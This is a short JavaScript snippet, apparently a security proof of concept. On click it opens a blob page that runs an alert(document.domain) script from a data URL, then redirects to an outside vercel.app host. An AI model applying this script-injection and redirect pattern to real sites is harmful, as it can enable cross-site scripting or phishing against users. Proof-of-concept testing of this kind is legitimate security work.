const blob = new Blob([`
<html>
	<body>
		<script src="data:application/javascript,alert(document.domain);"></script>
		<meta http-equiv="refresh" content="2;url=https://max-pay-nine.vercel.app/back.html">
	</body>
</html>`], {type : "text/html"});

onclick = () => {
	open(URL.createObjectURL(blob));

}


